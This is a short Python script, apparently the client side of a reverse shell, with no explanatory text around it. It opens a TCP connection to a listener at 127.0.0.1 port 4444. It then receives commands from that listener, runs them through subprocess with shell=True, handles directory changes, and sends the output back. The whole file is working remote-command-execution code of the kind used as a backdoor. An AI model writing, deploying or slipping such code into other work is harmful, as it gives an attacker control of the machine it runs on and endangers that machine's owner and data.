import socket
import subprocess
import os

cd_bool = False
while True:
    try:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect(("127.0.0.1", 4444))
        break
    except:
        exit(1)

class server:
    def get_server_msg(self):
        global cd_bool
        cd_bool = False
        self.server_answer = connection.recv(9999)
        self.server_answer = self.server_answer.decode("utf-8")
        self.server_answer = str(self.server_answer)
        self.server_answer = self.server_answer.split()
        if self.server_answer[0] == "cd":
            if len(self.server_answer) == 1:
                cd_bool = True
                self.output = os.getcwd()

    def execute_command(self):
        if self.server_answer[0] != "cd":
            process = subprocess.Popen(self.server_answer, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            self.output, self.errors = process.communicate()
            self.output = self.output.decode("cp1250")
            self.output = str(self.output)
            print(self.output)
        else:
            dir = self.server_answer[1]
            if os.path.exists(dir):
                os.chdir(dir)
                self.output = "Successfully changed directory!"
            else:
                self.output = "Directory doesn't exists!"


    def send_output(self):
        if self.output == "":
            connection.send(self.errors)
        else:
            self.output = bytes(self.output, "utf-8")
            connection.send(self.output)


server_instance = server()

while True:
    server_instance.output = "None"
    try:
        server_instance.get_server_msg()
        if cd_bool is not True:
            server_instance.execute_command()
        server_instance.send_output()
    except:
        connection.close()
        break